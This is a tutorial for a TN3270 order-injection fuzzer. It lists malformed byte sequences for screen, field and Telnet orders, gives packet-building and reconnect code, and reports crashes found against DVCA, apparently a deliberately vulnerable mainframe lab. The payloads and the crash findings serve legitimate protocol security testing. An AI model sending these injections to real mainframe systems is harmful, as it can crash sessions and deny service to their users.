# order_fuzz.py - TN3270 Order Injection Fuzzer Tutorial

This tutorial explains `order_fuzz.py`, which tests TN3270 protocol vulnerabilities by injecting malformed order sequences.

## Overview

TN3270 uses "orders" to control screen formatting, field definitions, and buffer addressing. `order_fuzz.py` systematically tests how the mainframe handles malformed or unexpected order sequences.

## Target Vulnerabilities

This fuzzer looks for:

| Vulnerability | Impact |
|--------------|--------|
| Buffer address manipulation | Screen hijacking |
| Field attribute corruption | Hidden field exposure |
| Parser confusion | Application crash |
| Connection termination | Denial of Service |

## TN3270 Orders Reference

Orders are control bytes in the 3270 data stream:

| Byte | Name | Format | Description |
|------|------|--------|-------------|
| 0x05 | PT | 1 byte | Program Tab |
| 0x08 | GE | 2 bytes | Graphic Escape + char |
| 0x11 | SBA | 3 bytes | Set Buffer Address + 2-byte addr |
| 0x12 | EUA | 3 bytes | Erase Unprotected to Address |
| 0x13 | IC | 1 byte | Insert Cursor |
| 0x1D | SF | 2 bytes | Start Field + attribute |
| 0x28 | SA | 3 bytes | Set Attribute + type + value |
| 0x29 | SFE | variable | Start Field Extended |
| 0x2C | MF | variable | Modify Field |
| 0x3C | RA | 4 bytes | Repeat to Address |

## Test Categories

### TEST 1: Single Order Bytes (Repeated)

```python
for order_byte, order_name in api.ORDERS.items():
    for repeat in [1, 2, 4, 8, 16]:
        injection = bytes([order_byte] * repeat)
        run_test(api, f"{order_name}x{repeat}", injection)
```

Tests each order byte repeated 1-16 times. The SBA injection (`0x11 0x11 0x11 0x11`) previously caused connection termination in DVCA.

### TEST 2: SBA Address Variations

```python
sba_tests = [
    ("SBA-NULL", bytes([0x11, 0x00, 0x00])),      # Null address
    ("SBA-MIN", bytes([0x11, 0x40, 0x40])),       # Position 0
    ("SBA-MAX", bytes([0x11, 0x7F, 0x7F])),       # Max valid
    ("SBA-FF", bytes([0x11, 0xFF, 0xFF])),        # Invalid bytes
    ("SBA-HALF", bytes([0x11, 0x40])),            # Incomplete
    ("SBA-ONLY", bytes([0x11])),                  # No address
    ("SBA-TRIPLE", bytes([0x11, 0x11, 0x11])),    # Nested SBA
    ("SBA-OVERFLOW", bytes([0x11, 0x7F, 0x7F, 0x7F, 0x7F])),
    ("SBA-CHAIN", bytes([0x11, 0x40, 0x40, 0x11, 0x40, 0x50])),
]
```

SBA is followed by a 2-byte address. Testing boundary conditions and malformed sequences.

### TEST 3: Start Field Variations

```python
sf_tests = [
    ("SF-ONLY", bytes([0x1D])),              # No attribute
    ("SF-NULL", bytes([0x1D, 0x00])),        # Null attribute
    ("SF-PROTECTED", bytes([0x1D, 0x20])),   # Protected field
    ("SF-HIDDEN", bytes([0x1D, 0x0C])),      # Hidden field
    ("SF-ALLBITS", bytes([0x1D, 0xFF])),     # All bits set
    ("SF-CHAIN", bytes([0x1D, 0x00, 0x1D, 0x20, 0x1D, 0x0C])),
    ("SF-MANY", bytes([0x1D, 0x00] * 20)),   # 20 consecutive
]
```

Tests field attribute parsing and rapid field creation.

### TEST 4: Start Field Extended

```python
sfe_tests = [
    ("SFE-ONLY", bytes([0x29])),                        # No count
    ("SFE-COUNT0", bytes([0x29, 0x00])),                # Count = 0
    ("SFE-COUNT1", bytes([0x29, 0x01, 0xC0, 0x00])),    # 1 pair
    ("SFE-COUNTFF", bytes([0x29, 0xFF])),               # Max count, no data
    ("SFE-PARTIAL", bytes([0x29, 0x02, 0xC0])),         # Incomplete
]
```

SFE format: `0x29 + count + (type, value) pairs`. Testing incomplete and invalid sequences.

### TEST 5: Repeat to Address

```python
ra_tests = [
    ("RA-ONLY", bytes([0x3C])),                   # No address
    ("RA-NOCHAR", bytes([0x3C, 0x40, 0x40])),     # No repeat char
    ("RA-STAR", bytes([0x3C, 0x5D, 0x7F, 0x5C])), # Fill with *
    ("RA-MAXADDR", bytes([0x3C, 0x7F, 0x7F, 0xC1])),
]
```

RA fills screen positions with a character. Testing buffer handling.

### TEST 6: Erase Unprotected to Address

```python
eua_tests = [
    ("EUA-ONLY", bytes([0x12])),
    ("EUA-START", bytes([0x12, 0x40, 0x40])),   # From position 0
    ("EUA-END", bytes([0x12, 0x5D, 0x7F])),     # To screen end
]
```

### TEST 7: Mixed Order Sequences

```python
mixed_tests = [
    ("MIX-SBA-SF", bytes([0x11, 0x40, 0x40, 0x1D, 0x00])),
    ("MIX-ALL", bytes([0x11, 0x40, 0x40, 0x1D, 0x00, 0x29, 0x01, 0xC0, 0x00, 0x13])),
    ("MIX-CHAOS", bytes([0x11, 0x1D, 0x29, 0x3C, 0x12, 0x13, 0x05, 0x08])),
]
```

Tests how the parser handles rapid order changes.

### TEST 8: Telnet Control Injection

```python
telnet_tests = [
    ("TEL-IAC", bytes([0xFF])),              # Interpret As Command
    ("TEL-IAC-IAC", bytes([0xFF, 0xFF])),    # Escaped IAC
    ("TEL-EOR", bytes([0xFF, 0xEF])),        # End of Record
    ("TEL-BRK", bytes([0xFF, 0xF3])),        # Break
    ("TEL-WILL", bytes([0xFF, 0xFB, 0x28])), # Will TN3270E
    ("TEL-FLOOD", bytes([0xFF] * 20)),       # IAC flood
]
```

Tests Telnet protocol handling within 3270 data.

### TEST 9: Raw Order Injection

```python
raw_tests = [
    ("RAW-SBA", bytes([0x11, 0x40, 0x40])),
    ("RAW-RA-FILL", bytes([0x3C, 0x5D, 0x7F, 0x40])),
]
```

Injects orders without the normal field wrapper.

## Packet Building

Uses API encoding functions:

```python
def build_injection_packet(api, injection_bytes, use_field=True):
    SBA = 0x11
    AID_ENTER = 0x7D
    
    cursor = api.encode_buffer_address(CURSOR_ADDR)
    field = api.encode_buffer_address(FIELD_ADDR)
    
    if api.is_tn3270e():
        packet = bytes([0x00, 0x00, 0x00, 0x00, 0x01, AID_ENTER]) + cursor
    else:
        packet = bytes([AID_ENTER]) + cursor
    
    if use_field:
        packet += bytes([SBA]) + field + injection_bytes
    else:
        packet += injection_bytes  # Raw injection
    
    packet += IAC_EOR
    return packet
```

## Connection Testing and Recovery

```python
def reconnect(api):
    try:
        api.disconnect()
    except:
        pass
    time.sleep(1)
    try:
        api.connect()
        return True
    except:
        return False

# After each test
if result == 'crash':
    findings['crash'].append((name, injection))
    if not reconnect(api):
        print("Failed to reconnect")
        break
```

## Running the Fuzzer

```bash
cd API-DVCA-Code
python order_fuzz.py
```

### Output

```
=========================================================================
TN3270 ORDER INJECTION ATTACK SURFACE MAPPER
=========================================================================

Using API orders: ['PT', 'GE', 'SBA', 'EUA', 'IC', 'SF', 'SA', 'SFE', 'MF', 'RA']

Connected!

=========================================================================
TEST 1: Single Order Bytes (repeated)
=========================================================================
  [PTx1] 05 OK
  [PTx2] 0505 OK
  [SBAx4] 11111111 *** CRASH: [WinError 10053] ***

  !!! Reconnecting...
  Reconnected.
```

### Summary Report

```
=========================================================================
ATTACK SURFACE MAPPING COMPLETE
=========================================================================
Total tests: 97

!!! CRASHES FOUND: 3 !!!
----------------------------------------
  SBAx4: 11111111
  SBA-TRIPLE: 111111
  MIX-NESTED-SBA: 11114040

!!! ABENDS FOUND: 1 !!!
----------------------------------------
  SFE-BADTYPE: 2901ffff
```

## API Functions Used

| Function | Purpose |
|----------|---------|
| `api.ORDERS` | Reference TN3270 order bytes |
| `encode_buffer_address()` | Convert position to bytes |
| `is_tn3270e()` | Check protocol mode |
| `check_abend()` | Detect mainframe errors |
| `test_connection()` | Verify connection is alive |
| `send_raw()` | Send injection packet |

## Findings Interpretation

| Result | Meaning | Security Impact |
|--------|---------|-----------------|
| **CRASH** | Connection lost | DoS, potential memory corruption |
| **ABEND** | Application error | Information disclosure, DoS |
| **NO_RESPONSE** | Silent failure | Possible state corruption |
| **OK** | Handled gracefully | No immediate vulnerability |

## Real-World Finding

The `SBAx4` injection (`0x11 0x11 0x11 0x11`) caused connection termination in DVCA. This indicates:

1. The parser reads SBA and expects 2 address bytes
2. Getting another SBA (0x11) as the first address byte confuses it
3. The continued 0x11 bytes cause a cascading parse error
4. Eventually crashes the connection handler

This is a **protocol parsing vulnerability** that could be exploited for:
- Denial of Service
- Session hijacking (if state is corrupted)
- Information disclosure (if error messages leak data)

## Customization

### Change Target Field

```python
CURSOR_ADDR = 423   # Cursor position
FIELD_ADDR = 583    # Field to inject into
```

### Add Custom Tests

```python
custom_tests = [
    ("CUSTOM-1", bytes([0x11, 0x00, 0x00, 0x1D, 0xFF])),
    ("CUSTOM-2", bytes([0x29, 0x10] + [0xC0, 0x00] * 16)),
]

for name, injection in custom_tests:
    run_test(api, name, injection)
```

## See Also

- `fuzz.py` - Comprehensive CICS payload fuzzer
- `fuzz2.py` - Dynamic field discovery fuzzer
- `fuzz3.py` - Protected/hidden field fuzzer
- `DVCA-TSO-Exploit.md` - Protected field exploitation
- `API_Documentation.md` - Full API reference
